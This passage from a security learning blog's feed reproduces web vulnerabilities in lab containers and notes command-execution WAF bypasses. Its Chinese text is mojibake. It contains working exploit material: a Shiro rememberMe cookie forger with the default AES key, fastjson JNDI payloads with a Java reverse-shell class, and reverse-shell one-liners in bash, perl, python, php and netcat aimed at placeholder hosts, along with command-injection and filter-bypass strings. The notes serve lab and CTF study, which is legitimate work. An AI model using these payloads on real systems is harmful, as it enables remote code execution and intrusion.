srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¸”php.iniè®¾ç½®äº†cgi.fix_pathinfo=1æ—¶,fastcgiä¼šè‡ªåŠ¨æ‰¾åˆ°ä¸Šçº§çš„1.jpgå¤„ç†ã€‚<br>æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯php-fpm.confä¸­çš„security.limit_extensionsé…ç½®é¡¹é™åˆ¶äº†fastcgiè§£ææ–‡ä»¶çš„ç±»å‹<br>è¿™é¡¹ä¸ºç©ºæ—¶å°±ä¼šå°†jpgæ–‡ä»¶å½“åšä»£ç è§£æã€‚</p><p>æ‰€ä»¥åªè¦</p><blockquote><p>1ã€ å°†php.iniæ–‡ä»¶ä¸­çš„cgi.fix_pathinfoçš„å€¼è®¾ç½®ä¸º0,è¿™æ ·phpå†è§£æ1.php/1.jpgè¿™æ ·çš„ç›®å½•æ—¶,åªè¦1.jpgä¸å­˜åœ¨å°±ä¼šæ˜¾ç¤º404é¡µé¢<br>  2ã€ php-fpm.confä¸­çš„security.limit_extensionsåé¢çš„å€¼è®¾ç½®ä¸º.php </p></blockquote><p>å°±å¯ä»¥é˜²æ­¢é”™è¯¯è§£æã€‚</p><h2 id="Nginx-æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰"><a href="#Nginx-æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰" class="headerlink" title="Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰"></a>Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰</h2><p>è¿™ä¸ªè·Ÿä¸Šé¢çš„æŒºåƒçš„ï¼Œ<br>éæ³•å­—ç¬¦ç©ºæ ¼å’Œæˆªæ­¢ç¬¦ï¼ˆ\0ï¼‰ä¼šå¯¼è‡´Nginxè§£æURIæ—¶çš„æœ‰é™çŠ¶æ€æœºæ··ä¹±ï¼Œå±å®³æ˜¯å…è®¸æ”»å‡»è€…é€šè¿‡ä¸€ä¸ªéç¼–ç ç©ºæ ¼ç»•è¿‡åç¼€åé™åˆ¶ã€‚<br><code>http://127.0.0.1/file.aaa \0.php</code><br>ä¸ç”¨è¯´ä¹ŸçŸ¥é“webshellå§¿åŠ¿+1</p><p>è¿˜æœ‰å‡ ä¸ªé…ç½®æ¼æ´å°±ä¸å¤ç°äº†hhh</p><h1 id="Apache-Shiro-1-2-4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰"><a href="#Apache-Shiro-1-2-4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰" class="headerlink" title="Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰"></a>Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰</h1><p>ä¸¥æ ¼æ¥è¯´è‡ªå·±å¹¶æ²¡æœ‰ç”¨vulhubçš„é•œåƒå®Œæˆå¤ç°.æ‰€ä»¥è‡ªå·±æ‰¾äº†ç½‘ä¸Šå…¶ä»–çš„å¤ç°æ–‡ç« ï¼Œç”¨äº†ä¸‹medicean/vulapps:s_shiro_1è¿™ä¸ªé•œåƒ,å§‘ä¸”æ˜¯èƒ½åšäº†</p><p>Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„Cookieä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨Shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ·Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>é¦–å…ˆå°±è¦å‡†å¤‡çš„æ˜¯javaååºåˆ—åŒ–çš„å·¥å…·ysoserial.è‡ªå·±ä¹‹å‰è¿˜åªç”¨è¿‡ysoserial.netã€‚æ²¡ç”¨è¿‡æœ¬å°Šè¿™ä¸ªjavaååºåˆ—åŒ–ç¥å™¨ã€‚å¯ä»¥ç›´æ¥å»githubé¡¹ç›®ä¸Šæ‰¾å·²ç»ç¼–è¯‘å¥½çš„jar.æˆ–è€…git cloneæºç ç”¨mvnç¼–è¯‘ã€‚æš‚ä¸”ä¸æã€‚</p><p>ç„¶åé¦–å…ˆéœ€è¦æ„é€ gadget.æˆ‘çš„ç›®çš„æ˜¯åå¼¹shell.æ‰€ä»¥è¦æŠŠåå¼¹shellçš„ä»£ç å‡†å¤‡ä¸‹(æ³¨æ„ã€‚javaååºåˆ—è§¦å‘åå¼¹shellä¸€å®šä¸èƒ½ç›´æ¥ä¼ å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œä¹‹å‰ghostcaté‡Œä¹Ÿæè¿‡äº†,å¿…é¡»è¦å­—ç¬¦ä¸²æ•°ç»„,å¦åˆ™<code>&gt;</code>è¿™æ ·çš„å­—ç¬¦è¿‡ä¸å»)è€Œæ­¤å¤„æˆ‘ä»¬é€‰æ‹©base64 åŠ å·¥å‘½ä»¤æ‰§è¡Œä»£ç è§£å†³è¿™ä¸ªé—®é¢˜<br>å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªç½‘ç«™ç›´æ¥å¾—åˆ°ç¼–ç payload<br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a><br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/17.PNG" class="lazyload" data-srcset="17.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿è¡Œå‘½ä»¤</p><pre><code class="bash">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;BASE64_ENCODED_COMMAND&#39;</code></pre><p>è¿™æ ·å°±èµ·äº†ä¸€ä¸ªJRMPæœåŠ¡ç›‘å¬6666ç«¯å£ã€‚å®ƒä¼šæ¥å—è¢«æ”»å‡»çš„æœåŠ¡å™¨<br>ä¿¡æ¯å¹¶ååºåˆ—åŒ–ï¼Œæ‰§è¡Œgadgetå¯¹åº”çš„å‘½ä»¤</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ åºåˆ—åŒ–çš„cookie rememberMeäº†ã€‚é¦–å…ˆåœ¨ç™»å½•ç•Œé¢å‹¾é€‰remembermeå¹¶æŠ“åŒ…ï¼Œå‡†å¤‡æ›¿æ¢cookieä¸ºæˆ‘ä»¬çš„åˆ©ç”¨cookie</p><p>åˆ©ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬ç”Ÿæˆcookieï¼Œå‚æ•°ä¼ <code>æ”»å‡»ipï¼šjavaç›‘å¬ç«¯å£</code></p><pre><code class="python">import uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])   print &quot;rememberMe={0}&quot;.format(payload.decode())</code></pre><p>æœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨äº†shiroé»˜è®¤å¯†é’¥è¿›è¡ŒAESåŠ å¯†ã€‚æ‰€ä»¥å¯è§ç¡¬ç¼–ç å¸¦æ¥çš„å±å®³ï¼Œå¯¼è‡´cookieå¯æ§å³å¯è§¦å‘ååºåˆ—åŒ–ã€‚<br>ç”Ÿæˆçš„cookieæ›¿æ¢å³å¯è§¦å‘ååºåˆ—åŒ–<br>ncç›‘å¬ç«¯å£å¾—åˆ°åå¼¹shell<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/18.PNG" class="lazyload" data-srcset="18.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/19.PNG" class="lazyload" data-srcset="19.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>vulhubçš„ç¯å¢ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆå¼¹ä¸åˆ°shell,è€Œå®ƒç»™å‡ºçš„æ–¹æ³•gadgetä¹Ÿå®Œå…¨ä¸ä¸€æ ·,ä¸è¿‡æ€è·¯å¤§åŒå°å¼‚ã€‚å°±æ˜¯æˆ‘çš„eclipseåŠ è½½é¡¹ç›®åŠå¤©æ²¡æå¥½â€¦</p><h2 id="fastjson-1-2-24-ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#fastjson-1-2-24-ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="fastjson 1.2.24 ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>fastjson 1.2.24 ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´</h2><p>æœ€è¿‘è«åæ„Ÿè§‰javaçš„é¢˜å¤šèµ·æ¥äº†ï¼Œåœ¨è§‚æ‘©å…¶ä»–dalaoä»¬çš„blogæ—¶ä¹Ÿå‘ç°ä¸å°‘å†…å®¹éƒ½åœ¨æ·±åº¦ç ”ç©¶javaçš„ç›¸å…³æ¼æ´ã€‚æ‰€ä»¥è‡ªå·±ä¹Ÿæ¥å°è¯•å¤šå¤ç°å‡ ä¸ªååºåˆ—åŒ–çš„æ´ã€‚è‡³å°‘å…ˆå½“ä¸ªè„šæœ¬å°å­,ç­‰åˆ°æš‘å‡å°±èƒ½å¥½å¥½ç ”ç©¶äº†ã€‚</p><p>é¦–å…ˆæ˜¯1.2.24çš„fastjson.è¿™é‡Œä¸»è¦æ˜¯ä¸€ä¸ªjndiæ³¨å…¥ã€‚å…¶åˆ©ç”¨æµç¨‹å¦‚ä¸‹ï¼š<br>é¦–å…ˆå‡†å¤‡å¥½åˆ©ç”¨çš„æºç exp.java</p><pre><code class="java">import java.lang.Runtime;import java.lang.Process;public class exp {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = { &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/xxxxxx/9001 0&gt;&amp;1&quot; };            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>ç„¶å<code>javac exp.java</code>ç¼–è¯‘å¥½å¾—åˆ°exp.classã€‚</p><p>è€ŒæœåŠ¡ç«¯åœ¨<code>Content-Type:application/json</code>ä¸‹,post jsonæ•°æ®</p><pre><code class="json">{    &quot;b&quot;:{        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://xxx:9999/exp&quot;,        &quot;autoCommit&quot;:true    }}</code></pre><p>è¿™é‡Œç”¨åˆ°äº†marshalsecè¿™ä¸ªå·¥å…·ã€‚åŸºæœ¬ä¸Šè·Ÿysoserialç”¨èµ·æ¥ä¸€æ ·çš„ã€‚æ‹·è´æºç mavenç¼–è¯‘å°±å¥½<br>æ¥ä¸‹æ¥å¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œç›‘å¬9999ç«¯å£ï¼Œå¹¶åˆ¶å®šåŠ è½½è¿œç¨‹ç±»exp.class</p><pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://xxx/#exp&quot; 9999</code></pre><p>å®‰å…¨èµ·è§,æœ€å¥½è¿˜æ˜¯æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹æ”¾classæ–‡ä»¶å¹¶ç”¨pythonç›‘å¬80ç«¯å£.</p><p>æœ¬æœºç›‘å¬9001ç«¯å£æ”¶åˆ°shell.<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/20.PNG" class="lazyload" data-srcset="20.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ¬è´¨ä¸Šå°±æ˜¯,JdbcRowSetImplè¿™ä¸ªç±»çš„dataSourceNameæ”¯æŒä¼ å…¥ä¸€ä¸ªrmiçš„æº.<br>å½“è§£æè¿™ä¸ªuriçš„æ—¶å€™ï¼Œå°±ä¼šæ”¯æŒrmiè¿œç¨‹è°ƒç”¨ï¼Œå»æŒ‡å®šçš„rmiåœ°å€ä¸­å»è°ƒç”¨æ–¹æ³•ã€‚<br>å½“è¿œç¨‹rmiæœåŠ¡æ‰¾ä¸åˆ°å¯¹åº”æ–¹æ³•æ—¶ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªè¿œç¨‹classè®©è¯·æ±‚æ–¹å»è°ƒç”¨ï¼Œä»è€Œå»è·å–æˆ‘ä»¬æ¶æ„æ„é€ çš„classæ–‡ä»¶ï¼Œä»è€ŒRCEã€‚</p><p>èµ·ä¸€ä¸ªldapæœåŠ¡ä¹Ÿæ˜¯ä¸€æ ·çš„,è€Œä¸”ldapä¼¼ä¹æ¯”rmié€‚ç”¨æ€§æ›´å¹¿ã€‚<br>åªè¦æ”¹æˆ<code>java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer</code>å¹¶æŠŠpayloadä¸­çš„<code>rmi://</code>æ¢æˆ<code>ldap://</code>å³å¯ã€‚</p><p>æ³¨æ„ä¸‹è¿™ä¸¤ä¸ªæœåŠ¡åˆ©ç”¨ç‰ˆæœ¬</p><ul><li>åŸºäºrmiçš„åˆ©ç”¨æ–¹å¼ï¼šé€‚ç”¨jdkç‰ˆæœ¬ï¼šJDK 6u132, JDK 7u122, JDK 8u113ä¹‹å‰ã€‚</li><li>åŸºäºldapçš„åˆ©ç”¨æ–¹å¼ï¼šé€‚ç”¨jdkç‰ˆæœ¬ï¼šJDK 11.0.1ã€8u191ã€7u201ã€6u211ä¹‹å‰ã€‚</li></ul><h2 id="Fastjson-1-2-47-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#Fastjson-1-2-47-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="Fastjson 1.2.47 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>Fastjson 1.2.47 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</h2><p>è·Ÿä¸Šé¢æ²¡å•¥å¤§åŒºåˆ«ã€‚ç¯å¢ƒæ˜¯<code>openjdk:8u102</code>ã€‚åŒæ ·å¯ä»¥åŠ è½½rmi</p><p>å®é™…ä¸Šæ˜¯å› ä¸ºæœ€æ—©çš„fastjsonååºåˆ—åŒ–ä¹Ÿå°±æ˜¯ä¸Šé¢é‚£ä¸ª,æ˜¯æ”¯æŒååºåˆ—åŒ–ä»»æ„ç±»çš„ã€‚åªè¦æœ‰<code>@type</code>å°±èƒ½åšåˆ°ã€‚è€Œåé¢çš„ç‰ˆæœ¬ä¸»è¦æ˜¯ç¦æ­¢äº†ååºåˆ—åŒ–ä»»æ„ç±»çš„æ“ä½œ,å¹¶ä¸”å¯¹å¯ä»¥åˆ©ç”¨çš„ç±»åŠ å…¥é»‘åå•è€Œå·²ã€‚<br><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">Fastjsonååºåˆ—åŒ–æ¼æ´ 1.2.24-1.2.48</a></p><p>è€Œè¿™ä¸ªç‰ˆæœ¬1.2.47çš„payloadåˆ™æ— éœ€å¼€å¯autotypeé€šæ€</p><pre><code class="json">{    &quot;a&quot;:{        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    },    &quot;b&quot;:{        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://xxxx:9999/Exploit&quot;,        &quot;autoCommit&quot;:true    }}</code></pre><p>ç„¶åè·Ÿä¸Šé¢æµç¨‹ä¸€æ ·çš„ç›´æ¥æ‰“,æ‹¿åˆ°shell.</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ ç¬”è®°-å‘½ä»¤æ‰§è¡ŒåŠèŠ±å¼bypasså†™shell</title>
      <link href="2020/03/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%8A%B1%E5%BC%8Fbypass%E5%86%99shell/"/>
      <url>2020/03/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%8A%B1%E5%BC%8Fbypass%E5%86%99shell/</url>
      
        <content type="html"><![CDATA[<p>  å‘½ä»¤æ‰§è¡Œçš„å‘å…¶å®æ—©å°±æƒ³å¡«äº†ã€‚æœ€æ—©æ˜¯å› ä¸ºæ ¡èµ›æ—¶ï¼Œeasyphpä¸€é¢˜è‡ªå·±å› ä¸ºä¸ç†Ÿæ‚‰å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç‰¹æ€§å¯¼è‡´å¥—å¨ƒé¢˜ç»•åˆ°æœ€åä¸€å±‚å´æ²¡æ‹¿åˆ°flagã€‚å½“æ—¶ååˆ†ä¸çˆ½ï¼Œä¸‹å®šå†³å¿ƒè¦å¥½å¥½äº†è§£ä¸‹å‘½ä»¤æ‰§è¡Œçš„ç›¸å…³çŸ¥è¯†ç‚¹ã€‚</p><p>å…³äºå‘½ä»¤æ‰§è¡Œæˆ‘å¤§ä½“ä¸Šå½’ä¸ºphpç»•è¿‡+rceä¸¤ç±»ã€‚phpçš„éš¾ç‚¹ä¸»è¦æ˜¯åœ¨ç»•è¿‡å†™shellä¸Šï¼Œè€Œlinuxçš„çŸ¥è¯†ä¸»è¦åœ¨RCEè¾¾æˆä¸Šã€‚</p><p>å…ˆä»ç®€å•è¯´èµ·ï¼š</p><a id="more"></a><h1 id="linux-å‘½ä»¤-amp-RCE"><a href="#linux-å‘½ä»¤-amp-RCE" class="headerlink" title="linux å‘½ä»¤&amp; RCE"></a>linux å‘½ä»¤&amp; RCE</h1><p>rce,å³remote command/code executeã€‚é€šå¸¸éƒ½æ˜¯æ¸—é€ä¸­å¸Œæœ›èƒ½å¤Ÿåˆ©ç”¨çš„æ¼æ´ä¹‹ä¸€ã€‚å› ä¸ºæˆ‘ä»¬å¯ä»¥ä»¥æ­¤è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè¯»å–æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶æˆ–è€…åå¼¹shellã€‚</p><h2 id="å‘½ä»¤åŠå…³é”®å­—waf"><a href="#å‘½ä»¤åŠå…³é”®å­—waf" class="headerlink" title="å‘½ä»¤åŠå…³é”®å­—waf"></a>å‘½ä»¤åŠå…³é”®å­—waf</h2><p>ç®€å•çš„å‘½ä»¤æ‰§è¡Œå¦‚DVWAé¶åœºé‡Œçš„command injection æ¨¡å—ã€‚å®ƒç»™äº†æˆ‘ä»¬ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè€Œå®ƒä¼šå°†è¾“å…¥æ¡†çš„å†…å®¹å½“åšå‘½ä»¤æ‰§è¡Œã€‚<br>è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±å¯ä»¥ç”¨å‘½ä»¤æ‹¼æ¥æ¥æ‰§è¡Œå…¶ä»–å‘½ä»¤ã€‚<br>1.ä½¿ç”¨<code>&amp;&amp; &amp; ;</code>ç›´æ¥å¤šè¯­å¥æ‰§è¡Œ</p><pre><code class="linux">127.0.0.1&amp;&amp;ls127.0.0.1&amp;ls127.0.0.1; ls</code></pre><p>2.é«˜çº§ä¸€(äº¿)ç‚¹çš„ï¼Œä½¿ç”¨ç®¡é“ç¬¦</p><pre><code class="bash">127.0.0.1| ls</code></pre><p>ç®¡é“ç¬¦çš„å¦™ç”¨ä¸æ­¢è¿™ä¹ˆä¸€ç‚¹äº†ã€‚æ¯”å¦‚CTFæˆ–å®æˆ˜æ¸—é€ä¸­éƒ½å¯èƒ½ç”¨åˆ°çš„</p><pre><code class="bash">echo &#39;Y2F0Cg==&#39; | base64 -d</code></pre><p>åªè¦ç”¨ç®¡é“ç¬¦å¯ä»¥bypassæ‰ç»å¤§éƒ¨åˆ†å…³é”®å­—çš„wafã€‚<br>å®é™…åˆ©ç”¨ä¹‹è¯»flag.php</p><pre><code class="bash">echo  Y2F0IGZsYWcucGhw|base64 -d|bash</code></pre><p>bashå¦‚æœæ²¡æœ‰å¯ä»¥ç”¨sh</p><pre><code class="bash">echo  Y2F0IGZsYWcucGhw|base64 -d|sh</code></pre><p>åŒæ—¶åº”å¯¹å…³é”®å­—wafï¼Œlinuxçš„ç‰¹æ€§è¿˜å…è®¸æˆ‘ä»¬èŠ±å¼ç»•è¿‡<br>å¯¹ç©ºæ ¼</p><pre><code class="bash">$IFS${IFS}$IFS$1 //$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ&lt; &lt;&gt; {cat,flag.php}  //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½%20 %09 </code></pre><p>å¯¹å…³é”®å­—ï¼Œå¦‚flagï¼Œcatï¼ŒåŒ…æ‹¬ä¸Šé¢ç®¡é“ç¬¦åœ¨å†…ä¹Ÿæœ‰å¾ˆå¤šæ–¹æ³•ã€‚</p><pre><code class="bash">cat fl*  linuxä¸­*é€šé…ç¬¦åŒ¹é…ä»»æ„å­—æ•°echo xxxxxxx| base64 -d ca\t fla\gcat fl&#39;&#39;aga=f;b=lag;cat $a$b</code></pre><p>å¯¹å‘½ä»¤å‡½æ•°catçš„waf,å¯»æ‰¾æ›¿ä»£ä¹Ÿæ˜¯ä¸€ç§æ–¹æ³•ï¼Œæ¯•ç«Ÿè¯»å–æ–‡ä»¶å‡½æ•°å¾ˆå¤šã€‚</p><pre><code class="bash">head  è¯»å¤´å‡ è¡Œtail    è¯»å°¾å‡ è¡Œtac     æŒ‰è¡Œå€’ç€è¯»more   lessnlsort......</code></pre><p>å¦‚æœè¦å¥‡æ·«æŠ€å·§ï¼Œå¯ä»¥ä½¿ç”¨å¦‚<code>cat `ls`</code><br>åå¼•å·åœ¨linuxä¸­ä½œä¸ºå†…è”æ‰§è¡Œã€‚å°†ç›´æ¥è¾“å‡ºç»“æœã€‚æ‰€ä»¥å‡å¦‚æˆ‘ä»¬å°±åœ¨flagçš„ç›®å½•ä¸‹ï¼Œè¿™æ˜¯å®Œå…¨å¯ä»¥ç›´æ¥è€çš„ã€‚</p><p>ä»¥ä¸Šéƒ½æ˜¯ç›´æ¥åœ¨webshellæ‰§è¡Œè¯»å–æ–‡ä»¶çš„åŸºç¡€ä¸Šçš„ã€‚å®é™…ä¸Šæœ‰æ—¶å€™æˆ‘ä»¬åœ¨å®é™…æ¸—é€ä¸­éœ€è¦çš„æ˜¯åå¼¹shellã€‚åŒ…æ‹¬æœ‰çš„é¢˜ç›®ä¹Ÿæ˜¯éœ€è¦shellæ¥æ‰¾flagçš„ã€‚<br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br>è¿™ä¸ªç½‘ç«™æ€»ç»“äº†å¸¸è§çš„åå¼¹shellçš„æ–¹å¼ã€‚å®é™…ä¸Šæ€»ç»“ä¸‹å¸¸è§çš„å‡ ç§åå¼¹shell<br>1.bash</p><pre><code class="bash">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</code></pre><p>bashå¼çš„ç”¨åˆ°çš„éå¸¸å¤šã€‚ç„¶è€Œè¿˜æ˜¯ä¼šå‡ºç°æœ‰çš„å®¹å™¨å› ä¸ºæ˜¯dockerèµ·çš„è€Œæ²¡æœ‰bashæŒ‡ä»¤çš„é—®é¢˜ï¼Œè¿™ç§æ—¶å€™é€šå¸¸ç”¨shæ›¿ä»£ã€‚ä½†æ˜¯shå¹¶ä¸èƒ½åå¼¹shellã€‚æ‰€ä»¥è¿™å°±æ¶‰åŠåˆ°å…¶ä»–çš„å‡ ç§æ–¹æ³•ã€‚</p><p>2.perl</p><pre><code class="bash">perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></pre><p>3.python</p><pre><code class="bash">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>é€‰æ‹©pythonæ˜¯ä¸ªä¸é”™çš„æ›¿ä»£æ–¹å¼ï¼Œå› ä¸ºå¤§éƒ¨åˆ†linuxæœºå­ä¸Šéƒ½è£…å¥½äº†pythonã€‚(æ¯”å¦‚é¢˜ç›®ç¯å¢ƒæ˜¯flaskèµ·çš„æ—¶å€™ï¼Œè‚¯å®šæ˜¯æœ‰pythonäº†)<br>4.php</p><pre><code class="bash">php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p>phpåŒç†ã€‚<br>5.netcat</p><pre><code class="bash">nc -e /bin/sh 10.0.0.1 1234</code></pre><p>åŸæ¥çœ‹åˆ°æ–‡ç« è¯´ï¼Œæ‰€æœ‰linuxæœºå­éƒ½é¢„è£…å¥½äº†ncã€‚æˆ‘è§‰å¾—æ˜¯å¾ˆæ£’çš„ã€‚ä¸è¿‡è‡ªå·±å°è¯•è¿‡ncåå¼¹çš„shelläº¤äº’æ€§ç¨å¾®å·®äº†ä¸€ç‚¹ç‚¹ã€‚</p><p>å¦‚æœé‡åˆ°wafï¼Œå¯ä»¥ç”¨ä¸Šé¢æ™®é€šå‘½ä»¤ä¸€æ ·çš„bypassæ–¹æ³•è§£å†³ã€‚<br>æˆ–è€…æˆ‘ä»¬å¯ä»¥å¦‚æ­¤ï¼Œä½¿ç”¨<code>curl 